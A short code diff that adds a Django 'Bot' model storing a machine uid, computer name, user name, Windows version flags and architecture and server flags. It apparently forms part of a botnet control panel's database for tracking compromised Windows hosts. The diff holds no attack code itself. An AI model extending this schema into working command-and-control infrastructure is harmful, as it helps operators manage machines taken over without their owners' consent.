@@ -1,3 +1,16 @@
 from django.db import models
 
-# Create your models here.
+
+class Bot(models.Model):
+    uid = models.CharField(max_length=100)
+    computername = models.CharField(max_length=100)
+    username = models.CharField(max_length=100)
+
+    is_win7 = models.BooleanField(default=False)
+    is_winxp = models.BooleanField(default=False)
+    is_win8 = models.BooleanField(default=False)
+    is_win10 = models.BooleanField(default=False)
+    is_win11 = models.BooleanField(default=False)
+
+    is_x64 = models.BooleanField(default=False)
+    is_server = models.BooleanField(default=False)
